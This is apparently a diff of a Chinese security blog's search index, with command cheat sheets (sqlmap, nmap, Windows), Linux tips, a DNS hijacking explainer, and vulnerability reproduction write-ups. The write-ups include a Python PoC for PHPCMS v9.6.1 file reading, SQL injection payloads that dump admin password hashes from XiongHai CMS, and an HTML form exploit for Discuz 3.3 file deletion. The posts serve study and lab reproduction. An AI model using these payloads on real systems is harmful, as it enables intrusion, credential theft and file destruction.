+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[常用WINDOWS的DOC命令]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E7%94%A8WINDOWS%E7%9A%84DOC%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[0x01 文件夹管理 cd 显示当前目录名或改变当前目录。 md 创建目录。 rd 删除一个目录。 dir 显示目录中的文件和子目录列表。 tree 以图形显示驱动器或路径的文件夹结构。 path 为可执行文件显示或设置一个搜索路径。 xcopy 复制文件和目录树。 0x02 文件管理 type 显示文本文件的内容。 more 以翻页的模式显示文本内容 copy 将一份或多份文件复制到另一个位置。 del 删除一个或数个文件。 move 移动文件并重命名文件和目录。(Windows XP Home Edition中没有) ren 重命名文件。 replace 替换文件。 attrib 显示或更改文件属性。 find 搜索字符串。 fc 比较两个文件或两个文件集并显示它们之间的不同 0x03 网络命令 ping 进行网络连接测试、名称解析 ftp 文件传输 net 网络命令集及用户管理 telnet 远程登陆 ipconfig显示、修改TCP/IP设置 arp 显示、修改局域网的IP地址-物理地址映射列表 0x04 系统管理 shutdown立即或定时关机或重启 tskill 结束进程 taskkill结束进程(比tskill高级，但WinXPHome版中无该命令) tasklist显示进程列表(Windows XP Home Edition中没有) sc 系统服务设置与控制 reg 注册表控制台工具 powercfg控制系统上的电源设置 netsh firewall set opmode mode=enable/disable 开启或关闭防火墙]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>工具使用</tag>
+        <tag>DOC命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[常用的SQLMAP命令]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E7%94%A8%E7%9A%84SQLMAP%E5%91%BD%E4%BB%A4%2F</url>
+    <content type="text"><![CDATA[0x01 总结sqlmap -u 网址sqlmap –dbs 列出所有数据库sqlmap –current-db 列出当前数据库sqlmap –tables 列出当前的表sqlmap –columns 列出当前的列sqlmap -D 选择使用哪个数据库sqlmap -T 选择使用哪个表sqlmap -C 选择使用哪个列sqlmap –dump 获取字段中的数据sqlmap –forms 尝试使用post注入sqlmap -r 加载文件中的HTTP请求，针对http头注入时最为有效sqlmap -g 利用google-hacking的语法进行自动化扫描是否有注入sqlmap –tamper “unmagicquotes.py” 利用脚本进行宽字节注入sqlmap –force-ssl 强制使用sslsqlmap –prefix 指定payload前缀sqlmap –suffix 指定payload后缀sqlmap -v 3 指定sqlmap的paylpoadsqlmap –technique=U/B/T/S 指定注入点类型 （union/boolean/time/stack）sqlmap –is-dba 查看是否是adminsqlmap –random-agent 构造随机的user-agentsqlmap –delay 设置多久访问一次sqlmap –os-shell 获取主机shell，一般不太好用，因为没权限sqlmap –read-file 读取制定文件]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>工具使用</tag>
+        <tag>SQLMAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[常见的NMAP命令总结]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%B8%B8%E8%A7%81%E7%9A%84NMAP%E5%91%BD%E4%BB%A4%E6%80%BB%E7%BB%93%2F</url>
+    <content type="text"><![CDATA[0x01 概述总结了一下常见的NMAP的使用命令，用来快速查看的，觉得有用的小伙伴可以收藏一下。 0x02 总结nmap -v 详细信息输出nmap -p 指定端口nmap -iL 扫描文件中的ipnmap -exclude 不扫描某些ipnmap -Pn 使用ping扫描，显式地关闭端口扫描，用于主机发现nmap -sn 使用ping扫描，进行端口扫描，假设主机都是up的nmap -sS 使用SYN扫描，不需要完成三次握手nmap -sT TCP connect扫描，需要完成三次握手，只适用于找出TCP和UDP端口nmap -sU 扫描UDP端口nmap -sF FIN扫描，用于探测防火墙状态，识别端口是否关闭，容易漏扫nmap -sV 扫描目标主机的端口和软件版本nmap -O 远程检测操作系统和软件nmap -O –osscan-guess 猜测目标操作系统版本nmap -traceroute 路由跟踪nmap -A 综合扫描，包含1-10000的端口ping扫描，操作系统扫描，脚本扫描，路由跟踪，服务探测nmap -oN result.txt 将标准输出写入到指定文件中nmap -oX result.xml 将输入写成xml的形式nmap -oS result.txt 将输出写成特殊符号的形式，内容跟-oN是一样的，只是字体变了而已nmap -oG result.txt 将输出写成特殊格式nmap -oA 将输出所有格式，有三种 .xml/ .gnmap/ .nmapnmap -T[0-5] 时间参数模板&nbsp;&nbsp;-T0 用于躲避IDS，时间很长&nbsp;&nbsp;-T1 用于躲避IDS，时间很长&nbsp;&nbsp;-T2 降低了扫描速度，使用更小的带宽和目标主机资源对目标靶机进行扫描&nbsp;&nbsp;-T3 默认模式，未做优化&nbsp;&nbsp;-T4 假设用户具有合适及可靠的网络而加速对目标靶机的扫描&nbsp;&nbsp;-T5 假设用户具有更好的网络或者愿意牺牲准确性而加速扫描nmap -sC 根据端口识别服务自动调用默认脚本nmap –script]]></content>
+      <categories>
+        <category>工具使用</category>
+      </categories>
+      <tags>
+        <tag>工具使用</tag>
+        <tag>NMAP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[DNS劫持与DNS污染]]></title>
+    <url>%2F2018%2F06%2F10%2FDNS%E5%8A%AB%E6%8C%81%E4%B8%8EDNS%E6%B1%A1%E6%9F%93%2F</url>
+    <content type="text"><![CDATA[0x01 DNS什么是DNS呢？DNS全称“Domain Name Server”，中文域名服务，通常我们会叫它域名解析协议。那么DNS用来干什么的呢？正如它的名字一样，用来解析域名的。我们平时访问一个网页，例如百度，我们会在地址栏中输入www.baidu.com，这个就是域名，但是对于计算机来说，它们工作的时候用的是ip地址，ip地址简单的说就是一串很长的数字，那么对于人来说很难记住，为了方便记住网址，域名就由此而来了。而DNS就是把域名转换为ip地址的一种服务也好，协议也罢，大概就是那种概念吧。 0x02 DNS工作流程DNS的工作流程是怎样的呢？ 当我们在地址栏中输入一个网址，并按下回车，域名解析的过程就开始了 计算机首先会在查找本地的HOSTS文件，如果有的话，就直接引用HOSTS文件中的域名对应的ip地址，那么本次域名解析的过程就结束了。 但是如果本地的HOSTS文件里没有对应的ip地址，那么就会看你的计算机有没有设置DNS服务器，如果没有设置，那么就没办法了，浏览器会报错，说网站的域名无法解析，本次解析过程就结束了。 如果设置了DNS服务器，那么计算机就会那着我们输入的网址到那个DNS服务器去查找，如果去查找的DNS服务器的过程中有服务器挂掉了，那么还是没办法，浏览器还是会报错。 如果没有错误，正常查询到了对应的ip，那么浏览器就会拿着这个ip地址来访问正常的web服务，本次解析过程结束。 0x03 DNS劫持通过上面说的过程，我们知道，一个域名解析的过程就是送计算机得到域名到远端的DNS服务器把结果给我们返回过来，因此这个过程如果有一个中间人，他截获了我们的DNS请求，然后返回一个恶意的ip地址给我们，那么我们的计算机就会把这个恶意的ip地址当作我们想要访问的域名的对应ip，那么每次我们想访问这个网站的时候就会访问那个恶意的ip，如果那个中间人制作了一个和我们想要访问的网址一样的前端界面，就很有可能完成一次钓鱼攻击。 0x04 DNS污染DNS污染通常还有说法叫做DNS投毒之类的，就是DNS查询的这个过程里，如果有人在你查询结果返回给你之前先一步将一个错误的ip给你，那么真正的查询结果返回的时候就会被忽略，那么你永远只能使用那个错误的ip来进行访问了，GFW的原理就是这个。]]></content>
+      <categories>
+        <category>Web安全</category>
+      </categories>
+      <tags>
+        <tag>DNS</tag>
+        <tag>Web安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[centos安装nc]]></title>
+    <url>%2F2018%2F06%2F10%2Fcentos%E5%AE%89%E8%A3%85nc%2F</url>
+    <content type="text"><![CDATA[123456789101112131415161718wget https://sourceforge.net/projects/netcat/files/netcat/0.7.1/netcat-0.7.1.tar.gztar -zxvf netcat-0.7.1.tar.gz -C /usr/localcd /usr/localmv netcat-0.7.1 netcatcd /usr/local/netcat./configuremake &amp;&amp; make install配置文件vim /etc/profile添加以下内容：export NETCAT_HOME=/usr/local/netcatexport PATH=$PATH:$NETCAT_HOME/bin保存，退出，并使配置生效：source /etc/profile]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>centos</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[SSH免密码登陆]]></title>
+    <url>%2F2018%2F06%2F10%2FSSH%E5%85%8D%E5%AF%86%E7%A0%81%E7%99%BB%E9%99%86%2F</url>
+    <content type="text"><![CDATA[首先生成自己的密钥对1ssh-keygen -t rsa 根据默认的位置应该在/home/.ssh/目录下 我使用的方法是ssh-copy-id 1ssh-copy-id -i ~/.ssh.id_rsa.pub &lt;登陆名&gt;@&lt;远程ip&gt; -p &lt;端口号&gt; 注意在这一步的时候会让你设置passphare，直接回车就好了，不然还是需要密码的。 然后使用1ssh &lt;登陆名&gt;@&lt;远程ip&gt; -p &lt;端口号&gt; 就可以直接登陆了。]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>SSH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux下PPPOE拨号]]></title>
+    <url>%2F2018%2F06%2F10%2FLinux%E4%B8%8BPPPOE%E6%8B%A8%E5%8F%B7%2F</url>
+    <content type="text"><![CDATA[打开终端 1sudo pppoeconf 按照提示进行填写用户名和密码 建立连接 1sudo pon dsl-provider 断开连接 1sudo poff dsl-provider]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux下开机自动挂载硬盘]]></title>
+    <url>%2F2018%2F06%2F10%2FLinux%E4%B8%8B%E5%BC%80%E6%9C%BA%E8%87%AA%E5%8A%A8%E6%8C%82%E8%BD%BD%E7%A1%AC%E7%9B%98%2F</url>
+    <content type="text"><![CDATA[首先cd到需要挂在的硬盘目录去，如果该硬盘的名字是中文的话，一般最后一级的目录名是一个很长的字母加数字的字符串，如果是英文的则就是那个英文名字，这个为该硬盘的UUID 查看 1sudo blkid 查看文件系统类型，一般是ntfs 编辑sudo gedit /etc/fstab UUID=(写那个UUID) (硬盘的绝对路径) ntfs default 0 0]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[安装ubuntu16.04之后要做的事]]></title>
+    <url>%2F2018%2F06%2F10%2F%E5%AE%89%E8%A3%85ubuntu16-04%E4%B9%8B%E5%90%8E%E8%A6%81%E5%81%9A%E7%9A%84%E4%BA%8B%2F</url>
+    <content type="text"><![CDATA[##0x01 写在前面 从用上linux到现在也有个小半年了，总是因为各种原因重装系统了五六次，每次安装完之后都要上网查重装系统要做的事，很麻烦，恰逢最近又重装了系统，记录一下我的安装之路。 ##0x02安装ubuntu16.04之后要做的事 更换源 采用了阿里源1sudo gedit /etc/apt/sources.list 将内容替换成12345678910deb http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-proposed main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse 然后保存退出1source /etc/apt/sources.list 然后更新一下1sudo apt-get update 删除不常用的软件 123sudo apt-get remove thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot sudo apt-get remove gnome-mines cheese transmission-common gnome-orca webbrowser-app gnome-sudoku landscape-client-ui-install sudo apt-get remove onboard deja-dup 删除Amazon链接1sudo apt-get remove unity-webapps-common 卸载libreOfficelibreoffice是ubuntu自带的开源office软件，体验效果不如windows上的office，可以用WPS代替。1sudo apt-get remove libreoffice-common 安装搜狗输入法 安装之前要把Fictx卸载1sudo apt remove fcitx* &amp;&amp; sudo apt autoremove 到官网下载搜狗输入法linux版本，下载后直接双击install即可 安装显卡驱动 我的显卡是GTX1060，具体的可以自己查找属于自己显卡的驱动型号12345sudo add-apt-repository ppa:graphics-drivers/ppa(好像不添加公钥也可以安装成功...)sudo apt-get updatesudo apt-get install nvidia-367sudo apt-get install mesa-common-devsudo apt-get install freeglut3-dev 主题美化 （这次重装之后发现主题美化是真的好看…）首先，安装Unity Tweak Tool1sudo apt-get install unity-tweak-tool 然后安装Flatabulous主题123sudo add-apt-repository ppa:noobslab/themessudo apt-get updatesudo apt-get install flatabulous-theme 再安装一下该主题的配套图标123sudo add-apt-repository ppa:noobslab/iconssudo apt-get updatesudo apt-get install ultra-flat-icons 安装好了之后，打开unity-tweak-tool，选择主题,修改为Flatabulous；打开图标栏,修改为Ultra-flat；打开面板,调整顶部菜单栏的透明度 安装vim 1sudo apt-get install vim 安装Sublime Text 3 123sudo add-apt-repository ppa:webupd8team/sublime-text-3 sudo apt-get update sudo apt-get install sublime-text 下面安装插件进入https://packagecontrol.io/installation，选择sublime text 3版本的内容，复制。打开sublime，ctrl + `，粘贴之后回车运行即可。 接下来我们安装Material Theme主题按ctrl+shift+p打开指令面板，在输入框输入install package后按Enter键，然后搜索”Material Theme”后按Enter键安装。 由于Sublime Text 3默认不支持中文编码，我们还要用上面相同的方式安装一下ConvertToUTF8插件 解决中文输入法问题，参考：http://blog.csdn.net/terence1212/article/details/51803123 安装java 首先下载jdkhttp://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html 下载好了之后新建目录：1sudo mkdir /usr/lib/jvm 然后将下载的jdk移动至该目录，并解压123sudo cp jdk-8u131-linux-x64.tar.gz /usr/lib/jvm/cd /usr/lib/jvm/sudo tar -zxvf jdk-8u131-linux-x64.tar.gz 然后配置环境变量1sudo gedit /etc/profile 文件末尾加入：1234export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_131export JRE_HOME=$&#123;JAVA_HOME&#125;/jreexport CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/libexport PATH=$&#123;JAVA_HOME&#125;/bin:$PATH 文件生效1source /etc/profile 检查配置是否成功：1java -version 安装字典 我选择的是Goldendict，在github找到了一个配置教程感觉很不错。https://github.com/yanyingwang/goldendict 安装截图工具 shutter123sudo add-apt-repository ppa:shutter/ppasudo apt updatesudo apt install shutter ##0x03 参考 http://www.fant0m.com/18.htmlhttps://github.com/yanyingwang/goldendict]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[ubuntu16.04修改成静态IP]]></title>
+    <url>%2F2018%2F06%2F10%2Fubuntu16-04%E4%BF%AE%E6%94%B9%E6%88%90%E9%9D%99%E6%80%81IP%2F</url>
+    <content type="text"><![CDATA[12345678910111213141516171819202122ifconfig获取本地网络名称sudo vim /etc/network/interfaces添加如下：auto ens33(本地网络名称)iface ens33 inet staticaddress xxx.xxx.xxx.xxx (想要设置的ip)gateway xxx.xxx.xxx.xxx (默认网关)netmask xxx.xxx.xxx.xxx (掩码)刷新ipsudo ip addr flush ens33sudo systemctl restart networking.service sudo vim /etc/NetworkManager/NerworkManager.conf将里面的managed设置为truesudo service network-manager restart重启服务]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>Ubuntu</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[xshell 5 不能使用退格键和Delete建]]></title>
+    <url>%2F2018%2F06%2F10%2Fxshell5%E4%B8%8D%E8%83%BD%E4%BD%BF%E7%94%A8%E9%80%80%E6%A0%BC%E9%94%AE%E5%92%8CDelete%E5%BB%BA%2F</url>
+    <content type="text"><![CDATA[0x01 问题安装完在使用的过程中发现不能使用退格键和delete键 0x02 解决方案文件 -》 打开 -》属性 -》 在终端找键盘选项 按照图片设置即可啦]]></content>
+      <categories>
+        <category>Linux</category>
+      </categories>
+      <tags>
+        <tag>小贴士</tag>
+        <tag>Linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[ZZCMS V8.2 SQL注入]]></title>
+    <url>%2F2018%2F06%2F10%2FZZCMSV8-2SQL%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞分析本次漏洞发生在/user/del.php中，首先，这里的pagename和tablename可以看到都是通过POST方法传进来的，但是只是用trim函数简单的处理了一下，之后也没有任何过滤的手段了，因此是一个比较简单的sql注入了。 在后面的112行将tablename带入到了sql语句中查询，并且tablename变量并没有用单引号包裹，可以直接发挥各种姿势。 0x02 漏洞利用这里有几点需要注意的是，在自己测试的时候需要注意zzcms_main中一定要有数据，否则的话会不成功的 payload大概如下，这里用的是盲注 放一下我的python利用代码： 效果：]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>PHP</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[PHPCMS v9.6.1任意文件读取漏洞]]></title>
+    <url>%2F2018%2F06%2F10%2F9%2F</url>
+    <content type="text"><![CDATA[0x01 漏洞分析首先本次漏洞的问题函数不在于某一处函数或者语句，而是在与多方面的因素共同作用，最终可以进行绕过从而进行任意文件读取。在phpcms中，有一个file_down函数用来下载文件的，该函数位于/phpcms/libs/functions/global.func.php 该函数就是一个正常的文件下载的函数，而调用这个函数的地方位于phpcms\modules\content\down.php 这里我们从下往上分析，首先调用file_down函数的fileurl参数中的&lt;&gt;被替换成空，往上看发现fileurl是当变量m存在时，变量s与之前的fileurl进行拼接而来的，再往上看发现之前的fileurl是变量f，因此我们要下载的文件参数是通过变量s和变量f拼接而来的！继续向上看，发现有一个parse_str($a_k)，因此变量s和变量f是通过parse_str解析a_k变量来的，而a_k变量是通过get方式接收的，因此可控！所以就有风险了。 不过我们能够发现，变量a_k在传进来之后，被传入到了一个sys_auth函数重新赋值了，这个函数是phpcms中一个用来加解密的函数，位于/phpcms/libs/functions/global.func.php 这里通过pc_auth_key变量的密钥进行解密。 到目前为止我们需要的是一个使用pc_auth_key密钥，通过sys_auth函数加密过的a_k变量，并且其中的s和f变量是我们可控的，从而才能通过解析出来后拼接，然后带入到file_down函数下载任意文件。 幸运的是，就在down.php中的init函数可以满足这个条件 可以看到在init函数的后边，就有一个将a_k变量同pc_auth_key进行加密，并且之后传入了download函数123$pc_auth_key = md5(pc_base::load_config(&apos;system&apos;,&apos;auth_key&apos;).$_SERVER[&apos;HTTP_USER_AGENT&apos;].&apos;down&apos;);$a_k = urlencode(sys_auth(&quot;i=$i&amp;d=$d&amp;s=$s&amp;t=&quot;.SYS_TIME.&quot;&amp;ip=&quot;.ip().&quot;&amp;m=&quot;.$m.&quot;&amp;f=$f&amp;modelid=&quot;.$modelid, &apos;ENCODE&apos;, $pc_auth_key));$downurl = &apos;?m=content&amp;c=down&amp;a=download&amp;a_k=&apos;.$a_k; 然后我们来从头看一下init函数。首先通过get方式接受参数a_k，然后将这个a_k变量进行解密，然后通过safe_replace函数进行过滤，然后通过parse_str进行解析，从而得到了s变量和f变量。所以这一阶段我们就需要一个加密过的a_k然后传给init函数。这里用到了之前phpcms的一个sql注入的利用方式，在位于/phpcms/modules/attachment/attachments.php 的swfupload_json()函数，代码如下： 这里主要看一下src参数，这里src参数通过get方式接收之后用trim函数去除首尾的空白符，然后通过过safe_replace函数进行过滤，之后通过arr数组进行json编码，后面出入到了set_cookie函数中，而这个函数位于/phpcms/libs/classes/param.class.php，代码如下： 可以看到进入后会通过for循环遍历数组，然后src的值会被sys_auth加密！现在我们可以回过头看一下之前一直被提到的safe_replace函数的作用吧，代码位于/phpcms/libs/functions/global.func.php，代码如下： 发现是将敏感符号替换为空，这个绕过就很好绕过了，比如当我们想输入单引号的时候%27，我们只要在其中加入一个位于黑名单的符号就可以了，比如%2;7，分号会被检测到然后替换成空，剩下了%27即为单引号了。 既然刚才在swfupload_json函数中找到了我们想要的结果，那么我们就看一下attachments类的构造函数，看看调用这个swfuplaod_json函数需要什么条件吧 函数最下面如果userid为空，会调用showmessage函数，那样程序会被中断的，因此就必须要userid有数据，那么往上看1$this-&gt;userid = $_SESSION[&apos;userid&apos;] ? $_SESSION[&apos;userid&apos;] : (param::get_cookie(&apos;_userid&apos;) ? param::get_cookie(&apos;_userid&apos;) : sys_auth($_POST[&apos;userid_flash&apos;],&apos;DECODE&apos;)); 上述语句是关键以seesion方式接收userid参数，当$_SESSION[‘userid’]有数据时，返回$_SESSION[‘userid’]，当为空时，进行判断：静态调用param类的get_cookie函数，并给该函数传递_userid字符串，如果返回不为空执行param::get_cookie(‘_userid’)，如果为空就执行sys_auth($_POST[‘userid_flash’],’DECODE’))sys_auth函数在这里进行解密操作，将用post方式接收到的userid_flash参数值，放进sys_auth函数进行解密session是在服务器端生成的，在不能登录的情况下，session中的userid是空的，因此就会执行get_cookie函数，该函数代码如下 ![](/images/PHPCMSv9.6.1任意文件读取漏洞14.png） 其中有sys_auth的解密操作，而如果get_cookie没结果也得DECODE，所以说这里decode是一个必须的操作，不过好消息是decode的目标是我们可以控制的，要么是cookie中的cookie_pre_userid，要么是post过去的userid_flash参数这里以cookie为例，如果我们需要一个通过set_cookie的加密过的cookie，让它传送到这里，然后就可以通过get_cookie进行解密，从而绕过这里的限制 这里用wap模块的一个地方，代码位于/phpcms/modules/wap/index.php 通过第9行调用set_cookie函数，就可以生成一个加密好的cookie了。 0x02 总线这次漏洞分析大概就是以寻找加密解密来进行分析的，总结了一下流程，如下 至此分析结束，下面设计一下poc 0x03 POC123456789101112131415161718192021222324import requestsurl_1 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=wap&amp;c=index&amp;a=init&amp;siteid=1&quot;r_g = requests.get(url_1)for cookie in r_g.cookies: if &apos;_siteid&apos; in cookie.name: userid = cookie.value print &quot;siteid: &quot; + userid + &quot;\n&quot;url_2 = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad%3Dx%26i%3D1%26modelid%3D1%26catid%3D1%26d%3D1%26m%3D1%26s%3Dindex%26f%3D.p%25253chp&quot;# ?m=attachment&amp;c=attachments&amp;a=swfupload_json&amp;aid=1&amp;src=pad=x&amp;i=1&amp;modelid=1&amp;catid=1&amp;d=1&amp;m=1&amp;s=index&amp;f=.p%253chpdata_1 = &#123;&apos;userid_flash&apos;: userid&#125;r_p = requests.post(url = url_2, data= data_1)for cookie in r_p.cookies: if &apos;_att_json&apos; in cookie.name: att_json = cookie.value print &quot;att_json: &quot; + att_json + &quot;\n&quot;key = &quot;http://127.0.0.1:8080/code_audit/phpcmsv9.6.1/install_package/index.php?m=content&amp;c=down&amp;a=init&amp;a_k=&quot; + att_jsonprint key 0x04 演示运行脚本]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>PHP</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[代码审计-熊海CMSv1.0]]></title>
+    <url>%2F2018%2F06%2F10%2F%E7%86%8A%E6%B5%B7CMSv1-0%2F</url>
+    <content type="text"><![CDATA[0x01 前言无意间发现一个代码审计的以前文章，是审计一篇cms的文章，然后就想着还没有认真的审计过一次呢，就跟着这篇文章的路子走一次吧，来开启我代码审计的篇章。 0x02 审计之旅首先在站长之家下载了熊海CMS v1.0的源代码，本地搭建好环境之后，将项目拖到Seay代码审计系统中，来一波自动审计~ 咳咳，经然后34个漏洞发现。。。好吧，毕竟小站源码，也很正常。然后就开始一个一个查看了，看看是否有误报和漏报。 0x03 文件包含 首先，index.php中的代码如下，明显就是一个文件包含漏洞嘛，这里参数r没有任何过滤直接放到include()函数中了，但是这里include是在files目录下的，所以需要../进行目录改变。我们可以在根目录下新建一个shell.php，写入&lt;?php phpinfo();?&gt;，然后尝试包含一下 果然成功了！嘻嘻 0x04 越权漏洞看了一下其他的漏洞，发现除了admin没看，其他的都是误报，但是现在我们还没有办法得到管理员的账号和密码，因此admin的先不看，看一下inc目录下的文件。inc目录下的都是配置文件，很重要，要每一个文件都仔细查看。 在看到checklogin.php的时候，发现了一个越权漏洞。 这里是从cookie中判断时候是管理员的机制，如果cookie中的user为空，就为跳转到?r=login页面，这个页面是后台登陆页面 那么如果我们抓包后将user的值修改成不为空会怎么样呢？这里用wzlist.php试一下1http://127.0.0.1/admin/?r=wzlist 然后就发现进入了后台。。。 并且只要保证每次cookie中user参数都有值就可以访问后台的所有内容。 之后再看其他的配置文件就看不出来什么了….那么记下来就是看一下admin目录下的文件吧。 0x05 SQL注入1首先肯定要看登陆页面了，如果能够爆出用户名和密码就完美了。查看login.php，入眼的就是一段令人激动的代码 这里user和password是直接获取POST传来的参数，并没有进行任何过滤，很容易想到万能密码的使用，但是继续看代码我们发现，这里是先进行user的查询，如果user在数据库中存在，那么就进行password的比较，是将我们输入的password进行md5哈希一下，然后与数据库中的进行比对，所以说万能密码在这里是没有用的，但是我们却可以用报错注入得到用户名和密码。123user=123&apos; or extractvalue(1,concat((select concat(0x7e,password,0x7e) from manage)))#&amp;password=或者user=123&apos; or updatexml(1,concat((select concat(0x7e,password,0x7e) from manage)),0)#&amp;password= 但是这里有一点比较坑的是，这里注出来的password最多只有27位，但是数据库存的是password的MD5值，有32位，所以说得到的md5是不对的，需要进行两次注入才能得到完整的密码，以extractvalue()函数为例,payload需要这样写 12user=123&apos; or extractvalue(1,concat((select concat(0x7e,password) from manage)))#&amp;password=user=123&apos; or extractvalue(1,concat((select concat(password,0x7e) from manage)))#&amp;password= 两次自己拼接一下就得到了完整的password的md5值了，拿去解密一下就好了~ 0x06 SQL注入2进入后台之后，可以看一下之前自动审计报的后台的SQL注入漏洞，拿newlink.php为例 这里的变量都是直接POST传进来并且没做任何过滤，那么就存在了SQL注入问题。利用之前的报错注入验证一下 得到结果 验证成功。 0x07 CSRF漏洞这里的内容管理中有一个删除文章的功能，点击后抓包得到url1http://localhost/code_audit/xhcms/admin/?r=wzlist&amp;delete=16 退出管理员账号，根据之前的越权漏洞分析，这里应该会转跳到login的界面，试一下，果然如此。 然后重新登陆管理员后点击该url，真的删除了该文章 验证成功。]]></content>
+      <categories>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>PHP</tag>
+        <tag>代码审计</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Discuz小于3.3任意文件删除漏洞]]></title>
+    <url>%2F2018%2F06%2F10%2FDiscuz%E5%B0%8F%E4%BA%8E3.3%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%2F</url>
+    <content type="text"><![CDATA[0x01 前言之前网上爆的的是Discuz！&lt;=3.4的任意文件删除漏洞，为什么这里变成3.3了呢？因为厂商已经把3.4的修复了，不过3.3版本还是存在问题的。 0x02 漏洞复现首先，在本地创建一个我们要删除的测试文件 注册一个账号 然后点击保存，用burp抓个包，就可以得到我们的formhash，并在birthprovince中修改成我们要删除的文件路径(../../../test.txt) 然后可以在本地创建一个文件上传的表单1234567891011121314&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Upload&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://127.0.0.1:8080/code_audit/Discuz_X3.3_SC_UTF8/upload/home.php?mod=spacecp&amp;ac=profile&amp;op=base method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;file&quot; name=&quot;birthprovince&quot; id=&quot;file&quot; /&gt; &lt;input type=&quot;text&quot; name=&quot;formhash&quot; value=&quot;a7ccdf77&quot;/&gt; &lt;input type=&quot;text&quot; name=&quot;profilesubmit&quot; value=&quot;1&quot;/&gt; &lt;input type=&quot;submit&quot; value=&quot;Submit&quot; /&gt;&lt;/from&gt;&lt;/body&gt;&lt;/html&gt; 然后点击上传 就完成了删除文件了~![](/images/Discuz3.3任意文件删除漏洞7.png 0x03 漏洞分析这里漏洞出现在/upload/source/include/spacecp/spacecp_profile.php 这里第182、183行有两个unlink()函数可以删除文件，但是需要formtype=file才可以，我们把这里的打印出来 发现并不是file，因此不能在这里进行删除，继续往下看， 第229行有一个unlink()函数，并且没有任何判断，也就是说只要程序运行到这里，就可以删除文件。看一下条件1@unlink(getglobal(&apos;setting/attachdir&apos;).&apos;./profile/&apos;.$space[$key]); 这里向上回溯，看一下$space[$key]在哪里。 出现在第23行，发现这个就是用户的个人设置，我们可以选择birthprovince，修改成要删除的文件就好了，然后实现一个上传文件 的表单，就可以删除文件了。]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>漏洞分析</tag>
+        <tag>PHP</tag>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Linux的SUID提权]]></title>
+    <url>%2F2018%2F06%2F10%2FLinux%E7%9A%84SUID%E6%8F%90%E6%9D%83%2F</url>
